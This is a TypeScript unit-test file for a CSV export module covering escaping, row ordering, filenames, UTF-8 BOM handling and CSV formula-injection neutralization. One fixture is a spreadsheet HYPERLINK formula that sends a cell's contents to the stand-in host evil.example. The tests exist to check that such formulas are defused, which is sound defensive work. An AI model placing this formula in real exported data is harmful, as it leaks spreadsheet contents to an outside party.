import type { AtcExportRow } from './csv-export';
import { describe, expect, it } from 'bun:test';
import { atcsExportFilename, readCsvForDownload, renderAtcsCsv, UTF8_BOM, withUtf8Bom } from './csv-export';

function row(overrides: Partial<AtcExportRow> = {}): AtcExportRow {
  return {
    id: '11111111-1111-4111-8111-111111111111',
    slug: 'login-happy-path',
    title: 'Login succeeds with valid credentials',
    module_path: 'Auth',
    layer: 'UI',
    tags: [],
    status: 'unrun',
    ...overrides,
  };
}

describe('renderAtcsCsv', () => {
  it('emits the fixed header in the exact contracted order (AC1.3)', () => {
    const csv = renderAtcsCsv([]);
    expect(csv).toBe('ATC ID,Slug,Title,Module,Layer,Tags,Status\r\n');
  });

  it('emits one data row per ATC, all 7 columns populated (AC1.1)', () => {
    const csv = renderAtcsCsv([row()]);
    const lines = csv.split('\r\n').filter(Boolean);
    expect(lines).toHaveLength(2);
    expect(lines[1]).toBe('11111111-1111-4111-8111-111111111111,login-happy-path,Login succeeds with valid credentials,Auth,UI,,unrun');
  });

  it('exports exactly 1 header + 1 data row for a single-ATC library (AC1.2)', () => {
    const csv = renderAtcsCsv([row()]);
    expect(csv.split('\r\n').filter(Boolean)).toHaveLength(2);
  });

  it('exports header-only for zero ATCs, never an error (AC2.1)', () => {
    const csv = renderAtcsCsv([]);
    expect(csv.split('\r\n').filter(Boolean)).toHaveLength(1);
  });

  it('exports exactly 501 rows for a 500-ATC library, none dropped (AC5.1)', () => {
    const rows = Array.from({ length: 500 }, (_, i) => row({ id: `atc-${i}`, slug: `atc-${i}` }));
    const csv = renderAtcsCsv(rows);
    expect(csv.split('\r\n').filter(Boolean)).toHaveLength(501);
  });

  it('joins multiple tags with "; " into a single cell (AC1.4, PO Q1)', () => {
    const csv = renderAtcsCsv([row({ tags: ['smoke', 'regression', 'critical-path'] })]);
    expect(csv).toContain('smoke; regression; critical-path');
  });

  it('passes each valid status value through verbatim (AC1.5)', () => {
    const statuses = ['pass', 'fail', 'blocked', 'skipped', 'running', 'unrun'];
    const rows = statuses.map(status => row({ id: status, slug: status, status }));
    const csv = renderAtcsCsv(rows);
    for (const status of statuses) {
      expect(csv).toContain(`,${status}\r\n`);
    }
  });

  it('quotes a Title containing only a comma (AC4.1)', () => {
    const csv = renderAtcsCsv([row({ title: 'Login, then verify session' })]);
    expect(csv).toContain('"Login, then verify session"');
  });

  it('quotes and doubles an embedded quote (AC4.2)', () => {
    const csv = renderAtcsCsv([row({ title: 'Click "Submit" button' })]);
    expect(csv).toContain('"Click ""Submit"" button"');
  });

  it('quotes and preserves an embedded line break (AC4.3)', () => {
    const csv = renderAtcsCsv([row({ title: 'Login fails\nwhen offline' })]);
    expect(csv).toContain('"Login fails\nwhen offline"');
  });

  it('quotes, doubles, and preserves comma + quote + line break combined (AC4.0)', () => {
    const csv = renderAtcsCsv([row({ title: 'Login "fails", when\npassword is empty' })]);
    expect(csv).toContain('"Login ""fails"", when\npassword is empty"');
  });

  it('escapes Title and Tags independently in the same row when both need it (AC4.4)', () => {
    const csv = renderAtcsCsv([row({
      title: 'Order "fails", edge-case',
      tags: ['blocker, urgent', 'p1'],
    })]);
    const dataLine = csv.split('\r\n')[1];
    expect(dataLine).toContain('"Order ""fails"", edge-case"');
    expect(dataLine).toContain('"blocker, urgent; p1"');
  });

  it('leaves both cells unquoted when neither has special characters (AC4.4 row 1)', () => {
    const csv = renderAtcsCsv([row({ title: 'Plain title', tags: ['smoke'] })]);
    const dataLine = csv.split('\r\n')[1];
    expect(dataLine).not.toContain('"');
  });

  it('quotes only the Tags cell when a tag\'s own text has a comma (AC4.5)', () => {
    const csv = renderAtcsCsv([row({ title: 'Plain title', tags: ['urgent, blocker'] })]);
    const dataLine = csv.split('\r\n')[1];
    expect(dataLine).toBe('11111111-1111-4111-8111-111111111111,login-happy-path,Plain title,Auth,UI,"urgent, blocker",unrun');
  });

  it('orders rows by module path then slug, deterministically', () => {
    const csv = renderAtcsCsv([
      row({ id: '2', slug: 'b-atc', module_path: 'Zeta' }),
      row({ id: '1', slug: 'a-atc', module_path: 'Alpha' }),
      row({ id: '3', slug: 'a-atc-2', module_path: 'Alpha' }),
    ]);
    const dataLines = csv.split('\r\n').filter(Boolean).slice(1);
    expect(dataLines.map(l => l.split(',')[0])).toEqual(['1', '3', '2']);
  });

  describe('CSV formula-injection neutralization (Conductor review, PR #207 MAJOR finding)', () => {
    it.each([
      ['=HYPERLINK("https://evil.example/?d="&A1,"Open")', '\'=HYPERLINK'],
      ['+1 234 5678', '\'+1 234'],
      ['-1 offset bug', '\'-1 offset'],
      ['@mobile flaky', '\'@mobile'],
      ['\ttabbed title', '\'\ttabbed'],
      ['\rcarriage title', '\'\rcarriage'],
    ])('prefixes a title starting with %j with a literal-text marker', (title, expectedPrefix) => {
      const csv = renderAtcsCsv([row({ title })]);
      const dataLine = csv.split('\r\n')[1];
      expect(dataLine).toContain(expectedPrefix);
    });

    it('does not touch a title that merely contains a trigger character mid-string', () => {
      const csv = renderAtcsCsv([row({ title: 'Total = 5' })]);
      const dataLine = csv.split('\r\n')[1];
      expect(dataLine).toContain(',Total = 5,');
    });

    it('neutralizes a Tags cell that starts with a trigger character after joining', () => {
      const csv = renderAtcsCsv([row({ title: 'Plain title', tags: ['=cmd', 'p1'] })]);
      const dataLine = csv.split('\r\n')[1];
      expect(dataLine).toContain('\'=cmd; p1');
    });

    it('neutralizes AND RFC4180-escapes a title that both triggers and needs quoting', () => {
      const csv = renderAtcsCsv([row({ title: '=cmd, "danger"' })]);
      const dataLine = csv.split('\r\n')[1];
      expect(dataLine).toContain('"\'=cmd, ""danger"""');
    });

    it('leaves the ATC ID, Layer and Status columns untouched — none of them can start with a trigger character', () => {
      const csv = renderAtcsCsv([row()]);
      const dataLine = csv.split('\r\n')[1];
      expect(dataLine.startsWith('11111111')).toBe(true);
    });
  });
});

describe('atcsExportFilename', () => {
  it('builds a stable, slug-based filename', () => {
    expect(atcsExportFilename('checkout-revamp')).toBe('checkout-revamp-atcs.csv');
  });
});

// BK-637 defect 1. Every test here reads a body that was put on the wire as
// BYTES, because that distinction IS the bug: a `Response` constructed from a
// JS string hands `text()` back the same string verbatim (no encode/decode
// round-trip, BOM intact), while a `Response` constructed from bytes — which
// is the only shape a browser ever sees — runs the WHATWG UTF-8 decode and
// drops the leading BOM. A test written against the string shape passes with
// or without the fix and proves nothing; that false green is what this ticket
// was filed about.
describe('BK-637 — the UTF-8 BOM survives the browser download path', () => {
  const csv = renderAtcsCsv([row({ title: 'Validación de pago' })]);

  // What the route actually puts on the wire, delivered the way the network
  // delivers it.
  function wireResponse(body: string): Response {
    return new Response(new TextEncoder().encode(body));
  }

  it('confirms the wire body carries the BOM bytes EF BB BF', async () => {
    const bytes = new Uint8Array(await wireResponse(withUtf8Bom(csv)).arrayBuffer());
    expect([...bytes.slice(0, 3)]).toEqual([0xEF, 0xBB, 0xBF]);
  });

  it('documents the stripping that causes the bug — a raw text() read loses the BOM', async () => {
    const stripped = await wireResponse(withUtf8Bom(csv)).text();
    expect(stripped.startsWith(UTF8_BOM)).toBe(false);
    expect(stripped.codePointAt(0)).toBe(csv.codePointAt(0));
  });

  it('restores the BOM on the string handed to the Blob, so the saved file opens as UTF-8 in Excel', async () => {
    const forDownload = await readCsvForDownload(wireResponse(withUtf8Bom(csv)));
    expect(forDownload.codePointAt(0)).toBe(0xFEFF);
    expect(forDownload.slice(1)).toBe(csv);
  });

  it('writes exactly one BOM even when a runtime hands back a body that kept its own', async () => {
    const forDownload = await readCsvForDownload(new Response(withUtf8Bom(csv)));
    expect(forDownload.startsWith(UTF8_BOM + UTF8_BOM)).toBe(false);
    expect(forDownload).toBe(withUtf8Bom(csv));
  });

  it('is idempotent on a body that already starts with a BOM', () => {
    expect(withUtf8Bom(withUtf8Bom(csv))).toBe(withUtf8Bom(csv));
    expect(withUtf8Bom(csv).slice(1)).toBe(csv);
  });
});
